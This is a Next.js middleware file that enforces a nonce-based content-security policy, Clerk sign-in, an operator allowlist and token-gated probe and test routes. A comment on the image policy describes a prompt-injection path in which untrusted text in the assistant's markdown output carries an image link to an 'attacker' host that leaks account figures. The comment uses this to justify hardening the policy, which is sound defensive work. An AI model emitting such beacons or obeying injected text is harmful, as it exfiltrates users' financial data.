import { clerkMiddleware, createRouteMatcher } from "@clerk/nextjs/server";
import { NextResponse } from "next/server";
import type { NextFetchEvent, NextRequest } from "next/server";
import {
  getRequestId,
  jsonApiError,
  setNoStoreResponseHeaders,
} from "@/lib/apiContracts";
import { isAuthorizedProbeRequest } from "@/lib/probeAuth";
import { IMAGE_HOST_SOURCES } from "@/lib/imageHosts";
import {
  AUTHENTICATED_SHARE_GENERATOR_ROUTES,
  PUBLIC_SHARE_API_ROUTES,
} from "@/lib/publicShareRoutes";
import { handleDemoGate } from "@/lib/demo/demoGate";
import type { DemoPublicMetadata } from "@/lib/demo/demoRole";

// ── Enforced Content-Security-Policy (per-request nonce) ────────────────────
//
// Was a Report-Only header in next.config.mjs. Now ENFORCED and owned here so
// each HTML response carries a fresh nonce.
//
// script-src = 'self' + per-request nonce + the Clerk host allowlist. The nonce
// covers Next.js's inline + framework <script> tags and our own inline
// ThemeBootstrap. Clerk renders its loader (clerk.browser.js) as a STATIC
// <script src> WITHOUT a nonce and does not propagate the request nonce to it,
// so it must be admitted by host. We deliberately do NOT use 'strict-dynamic'
// here: strict-dynamic makes host allowlists inert and would BLOCK Clerk's
// unnonced loader, breaking sign-in (verified 2026-06-29). nonce + tight host
// allowlist still removes 'unsafe-inline' and 'unsafe-eval' — the actual audit
// finding. (Future hardening: pass `nonce` to <ClerkProvider> so Clerk nonces
// its loader, then strict-dynamic becomes possible.)
//
// 'unsafe-eval': intentionally OMITTED. Next.js (App Router, production) and the
// modern Clerk SDK do not require eval at runtime; local dev (HMR, which does
// eval) bypasses CSP entirely below. If a violation surfaces a genuine eval
// need, set CSP_ALLOW_UNSAFE_EVAL = true to re-admit it.
//
// Edge-safe: btoa + Web Crypto only, no node:* (see feedback_middleware_edge_runtime).
const CSP_ALLOW_UNSAFE_EVAL = false;
const CLERK_HOSTS =
  "https://clerk.radon.run https://*.clerk.accounts.dev https://clerk.accounts.dev";

// Cloudflare Turnstile CAPTCHA — Clerk loads its bot-protection challenge from
// this origin as both an unnonced <script src> and a sandboxed <iframe>.
// Must appear in script-src AND frame-src. Turnstile needs no img-src entry
// (its challenge renders inside that iframe, under the iframe's own origin);
// connect-src / worker-src stay open via their https: / wss: / blob: wildcards.
// img-src is NOT a wildcard any more — see IMAGE_HOSTS below before adding an
// image source for anything.
const CAPTCHA_HOSTS = "https://challenges.cloudflare.com";

// img-src was a bare `https:` wildcard, which gave any image URL that reaches
// the DOM a network egress path to an arbitrary host. The assistant renders
// model output as markdown, and that output can quote untrusted retrieved text
// (scraped newsfeed bodies), so an injected `![](https://attacker/?d=…)` was an
// exfiltration beacon for whatever account figures the answer carried. Scoped
// to the hosts the app actually loads images from: the Radon media CDN
// (newsfeed cards, avatars; matches next.config.mjs images.remotePatterns) and
// Clerk's image CDN (user.imageUrl). Same-origin /_next/image output, data:
// avatar uploads and blob: share previews are covered by the literals below.
// The host list lives in lib/imageHosts.ts so the profile avatar validator
// cannot drift wider than what this directive permits.
const IMAGE_HOSTS = IMAGE_HOST_SOURCES;

export function generateNonce(): string {
  return btoa(crypto.randomUUID());
}

export function buildCspWithNonce(nonce: string): string {
  const scriptSrc = [
    "script-src 'self'",
    `'nonce-${nonce}'`,
    CLERK_HOSTS,
    CAPTCHA_HOSTS,
    CSP_ALLOW_UNSAFE_EVAL ? "'unsafe-eval'" : "",
  ]
    .filter(Boolean)
    .join(" ");
  return [
    "default-src 'self'",
    scriptSrc,
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    `img-src 'self' ${IMAGE_HOSTS} ${CLERK_HOSTS} data: blob:`,
    "connect-src 'self' wss: https:",
    // Clerk's clerk-js spawns a same-origin blob: Web Worker (bot/telemetry);
    // worker-src falls back to script-src, which would block it without this.
    "worker-src 'self' blob:",
    // blob: — the "Share to X" modal (ShareReportModal.tsx) previews the report
    // card in an <iframe src={URL.createObjectURL(blob)}>. Without blob: here the
    // frame is refused ("This content is blocked"). Same-origin, app-generated.
    `frame-src 'self' blob: ${CLERK_HOSTS} ${CAPTCHA_HOSTS}`,
    "frame-ancestors 'none'",
    "object-src 'none'",
    "base-uri 'self'",
    `form-action 'self' ${CLERK_HOSTS}`,
  ].join("; ");
}

// Build the pass-through response for an HTML route: forward the nonce to the
// app (so ThemeBootstrap's inline <script nonce> and Next.js's own framework
// scripts pick it up) AND set the matching enforced CSP on the response. The
// nonce header and the CSP header ALWAYS travel together; any path that does
// not call this emits no CSP, so it can never white-screen for a missing nonce.
export function withNonceCsp(request: NextRequest): NextResponse {
  const nonce = generateNonce();
  const csp = buildCspWithNonce(nonce);
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("x-nonce", nonce);
  // Next.js reads the nonce from the CSP request header to nonce its own
  // framework <script> tags; x-nonce is what our own components read.
  requestHeaders.set("Content-Security-Policy", csp);
  const response = NextResponse.next({ request: { headers: requestHeaders } });
  response.headers.set("Content-Security-Policy", csp);
  return response;
}

// Playwright bypass. The server flag alone grants nothing: each request must
// present the high-entropy token generated by playwright.config.ts. Host is
// deliberately irrelevant because it is client controlled.
export function isAuthlessTestBypassEnabled(
  providedToken: string | null,
  expectedToken: string | undefined = process.env.RADON_AUTHLESS_TEST_TOKEN,
  flag: string | undefined = process.env.RADON_AUTHLESS_TEST,
): boolean {
  return flag === "1" && Boolean(expectedToken) && providedToken === expectedToken;
}

// Share-card link previews — definition + rationale live in
// @/lib/publicShareRoutes (shared with app/robots.ts, which must carve these
// out of its Disallow: / so preview bots keep unfurling shared cards).
// Re-exported so the perimeter tests keep pinning it from the middleware.
export { AUTHENTICATED_SHARE_GENERATOR_ROUTES, PUBLIC_SHARE_API_ROUTES };

// Inbound webhooks — verified by the SENDER's signature inside the route
// handler (svix HMAC for Clerk), not by a Clerk session. EXPLICIT list with a
// filesystem pin (web/tests/middleware-share-allowlist.test.ts), same
// default-deny discipline as the share + probe scopes: a new webhook route
// must be added here deliberately, never auto-published by a pattern.
export const PUBLIC_WEBHOOK_API_ROUTES = ["/api/webhooks/clerk"] as const;

// Public allowlist. Every other route — pages AND /api/* — requires a Clerk
// session. The narrow exemptions:
//
//   /sign-in, /sign-up                  — Clerk auth flow pages
//   PUBLIC_SHARE_API_ROUTES             — READ-ONLY share-card link previews
//                                          (above). The generator POSTs are
//                                          deliberately absent: they execute a
//                                          report script on the trading host.
//   /api/service-health                 — dashboard banner data; intentionally
//                                          accessible so monitoring pollers
//                                          and the future public status page
//                                          don't need a session.
//   /api/health                         — pre-approved liveness probe for any
//                                          future Next.js-side health route.
//
// Before 2026-05-15 the matcher contained `/api/(.*)` which left every API
// route open to the world. The page route protection was always working;
// only `/api/*` was the hole.
export const isPublicRoute = createRouteMatcher([
  "/sign-in(.*)",
  "/sign-up(.*)",
  // Expired-demo landing page — the demo gate redirects signed-in expired
  // trial users here; it must bypass auth or the gate would loop on itself.
  "/trial-expired",
  // Crawler policy (app/robots.ts) — crawlers have no Clerk session; without
  // this exemption /robots.txt redirects to /sign-in and the disallow-all
  // policy is never served (Google indexed exactly that redirect URL).
  "/robots.txt",
  ...PUBLIC_SHARE_API_ROUTES,
  ...PUBLIC_WEBHOOK_API_ROUTES,
  "/api/health",
]);

export function isApiPath(pathname: string): boolean {
  return pathname === "/api" || pathname.startsWith("/api/");
}

// Link-preview bots only ever GET a card, so the share exemption is scoped to
// reads. A write to a public preview path is not a preview fetch and falls
// through to Clerk. Scoped to the share paths so the webhook POST and the Clerk
// auth pages keep their exemption.
const PREVIEW_SAFE_METHODS = new Set(["GET", "HEAD"]);

export function isPublicRequest(request: NextRequest): boolean {
  if (!isPublicRoute(request)) return false;
  if (!(PUBLIC_SHARE_API_ROUTES as readonly string[]).includes(request.nextUrl.pathname)) {
    return true;
  }
  return PREVIEW_SAFE_METHODS.has(request.method.toUpperCase());
}

// Operator allowlist — the AUTHORIZATION layer on top of authentication.
//
// A valid Clerk session authenticates a user; it does NOT authorize them. The
// data tables (portfolio/journal/orders) are global with no user_id, and the
// FastAPI ALLOWED_USER_IDS allowlist is bypassed for trusted-local Next->API
// calls — so without this gate ANY signed-in user in the production Clerk
// instance could read the operator's real account (incident 2026-06-27).
//
// When ALLOWED_USER_IDS is set, only those Clerk user ids may proceed; every
// other authenticated user gets 403 — including demo-role users, who belong on
// demo.radon.run, not the operator app. Empty/unset => no enforcement, so local
// dev, CI/tests, and the demo deployment (where ALLOWED_USER_IDS is absent and
// the demo gate governs instead) are unaffected.
//
// Edge-safe: pure string ops, no node:* imports (the middleware runs in the
// Edge runtime; see feedback_middleware_edge_runtime).
export function parseAllowedUserIds(
  raw: string | undefined = process.env.ALLOWED_USER_IDS,
): Set<string> {
  return new Set(
    (raw ?? "")
      .split(",")
      .map((id) => id.trim())
      .filter(Boolean),
  );
}

// Production interlock. When RADON_REQUIRE_OPERATOR_ALLOWLIST=1 (set ONLY in the
// Hetzner radon-nextjs env), an EMPTY allowlist fails CLOSED instead of open —
// see isAuthorizedUser. Absent everywhere else (dev, CI, and demo.radon.run's
// Vercel env), so it changes nothing until the operator opts in on prod.
export function requiresOperatorAllowlist(
  flag: string | undefined = process.env.RADON_REQUIRE_OPERATOR_ALLOWLIST,
): boolean {
  return flag === "1";
}

export function isAuthorizedUser(
  userId: string,
  raw: string | undefined = process.env.ALLOWED_USER_IDS,
  requireAllowlist: boolean = requiresOperatorAllowlist(),
): boolean {
  const allow = parseAllowedUserIds(raw);
  if (allow.size === 0) {
    // No allowlist configured. Default (dev, CI, demo.radon.run): fail OPEN —
    // the demo gate governs the demo deployment and local dev must not wall
    // itself off. Production sets RADON_REQUIRE_OPERATOR_ALLOWLIST=1 so a
    // blanked/typo'd ALLOWED_USER_IDS fails CLOSED (deny EVERY authenticated
    // user, operator included) rather than silently re-opening the operator app
    // to any signed-in demo user on the shared Clerk instance (the 2026-06-27
    // incident class). Better locked-out-and-loud than world-open-and-silent.
    return !requireAllowlist;
  }
  return allow.has(userId);
}

// Bearer-gated probe surface (DUR-16) — the Tier-3 off-box prober (GitHub
// Actions, no Clerk session) authenticates with
// `Authorization: Bearer ${RADON_PROBE_FRESHNESS_TOKEN}` instead of Clerk.
// DELIBERATELY not in isPublicRoute: a public listing would skip the bearer
// check entirely. EXPLICIT list, same default-deny discipline as
// PUBLIC_SHARE_API_ROUTES — a new probe route must be added here AND to the
// filesystem pin in web/tests/middleware-share-allowlist.test.ts.
export const PROBE_BEARER_API_ROUTES = ["/api/probe/freshness"] as const;

export function isProbeBearerRoute(pathname: string): boolean {
  return (PROBE_BEARER_API_ROUTES as readonly string[]).includes(pathname);
}

/**
 * Middleware gate for the probe routes. Returns:
 *   - null                  — not a probe route; fall through to Clerk.
 *   - NextResponse.next()   — correct bearer token; let the route run.
 *   - 401 JSON              — missing/wrong token, or the server token is
 *                             unset (fail closed). Body carries no detail
 *                             about WHY, so the response doesn't help an
 *                             attacker distinguish the cases.
 *
 * Token compare is timing-safe via Web Crypto (lib/probeAuth.ts) — the
 * middleware runs in the Edge runtime, so node:crypto is off the table.
 */
export async function handleProbeBearerGate(
  request: NextRequest,
  expectedToken: string | undefined = process.env.RADON_PROBE_FRESHNESS_TOKEN,
): Promise<NextResponse | null> {
  if (!isProbeBearerRoute(request.nextUrl.pathname)) return null;
  const authorized = await isAuthorizedProbeRequest(
    request.headers.get("authorization"),
    expectedToken,
  );
  if (authorized) return NextResponse.next();
  const requestId = getRequestId();
  const response = jsonApiError({
    message: "Unauthorized",
    status: 401,
    code: "UNAUTHORIZED",
    requestId,
  });
  return setNoStoreResponseHeaders(response, requestId);
}

// The Clerk-wrapped handler. Reached ONLY for requests that are not
// authless-bypassed (see the default export below): production, and any
// non-local host. Keeping Clerk out of the bypass path is essential — a Clerk
// DEVELOPMENT instance (pk_test_) answers any cookie-less browser NAVIGATION
// with a dev-browser handshake 307 to clerk.<frontend-api>/v1/client/handshake,
// which in a hermetic e2e run points at an unresolvable dummy Clerk host and
// fails the navigation with ERR_NAME_NOT_RESOLVED. Returning next() from INSIDE
// this wrapper did NOT suppress that handshake; only never entering the wrapper
// does.
const clerkHandler = clerkMiddleware(async (auth, request) => {
  // Public HTML auth pages (/sign-in, /sign-up) still render through the root
  // layout + ThemeBootstrap, so they need the nonce + enforced CSP too. The
  // enumerated public *API* routes (share/webhook) return JSON with no inline
  // scripts — emitting CSP on them is harmless and keeps one code path.
  if (isPublicRequest(request)) return withNonceCsp(request);

  const isApi = isApiPath(request.nextUrl.pathname);
  const { userId, sessionClaims } = await auth();

  // 1) Authentication — must have a Clerk session.
  //
  // API routes return a JSON 401 with the same shape as every other API error
  // response (see web/lib/apiContracts.ts). Clerk's default for a protected
  // route is to redirect to /sign-in, which is meaningless for an API client
  // and would also surface as a noisy 302 in the browser console when the
  // cookie expires mid-session. Page routes keep the standard redirect.
  if (!userId) {
    if (isApi) {
      const requestId = getRequestId();
      const response = jsonApiError({
        message: "Unauthorized",
        status: 401,
        code: "UNAUTHORIZED",
        requestId,
      });
      return setNoStoreResponseHeaders(response, requestId);
    }
    await auth.protect();
    return;
  }

  // 2) Authorization — a Clerk session is necessary but NOT sufficient. When
  // ALLOWED_USER_IDS is configured (production app.radon.run), only the
  // operator id(s) pass; every other authenticated user is forbidden (403),
  // including demo-role users (they belong on demo.radon.run). No allowlist =>
  // no enforcement, so the demo gate below governs the demo deployment.
  if (!isAuthorizedUser(userId)) {
    const requestId = getRequestId();
    if (isApi) {
      const response = jsonApiError({
        message: "Forbidden",
        status: 403,
        code: "FORBIDDEN",
        requestId,
      });
      return setNoStoreResponseHeaders(response, requestId);
    }
    const response = new NextResponse(
      "Not authorized. This account does not have access to Radon.",
      { status: 403, headers: { "content-type": "text/plain; charset=utf-8" } },
    );
    return setNoStoreResponseHeaders(response, requestId);
  }

  // 3) Demo trial gate (expiry + tiered rate-limit). No-ops for non-demo users.
  const demoGate = await handleDemoGate({
    userId,
    metadata: sessionClaims?.metadata as DemoPublicMetadata | undefined,
    request,
  }, { demoDeployment: process.env.NEXT_PUBLIC_RADON_DEMO === "1" });
  if (demoGate) return demoGate;

  // Authenticated + authorized: render the page with a fresh nonce + enforced
  // CSP. This is the former implicit `return;` (NextResponse.next) fall-through.
  return withNonceCsp(request);
});

// Entry point. The probe bearer gate and the local/authless bypass run BEFORE
// (and OUTSIDE) clerkMiddleware, so a bypassed request never triggers Clerk's
// dev-browser handshake. Everything else delegates to the Clerk-wrapped handler.
export default async function middleware(
  request: NextRequest,
  event: NextFetchEvent,
) {
  // Probe routes are bearer-gated EVERYWHERE — before the local-dev bypass —
  // so the gate behaves identically in dev, tests, and production.
  const probeGate = await handleProbeBearerGate(request);
  if (probeGate) return probeGate;

  if (isAuthlessTestBypassEnabled(request.headers.get("x-radon-authless-test"))) {
    return NextResponse.next();
  }

  return clerkHandler(request, event);
}

export const config = {
  matcher: [
    // Skip Next.js internals and all static files, unless found in search params
    "/((?!_next|[^?]*\\.(?:html?|css|js(?!on)|jpe?g|webp|png|gif|svg|ttf|woff2?|ico|csv|docx?|xlsx?|zip|webmanifest)).*)",
    // Always run for API routes
    "/(api|trpc)(.*)",
  ],
};
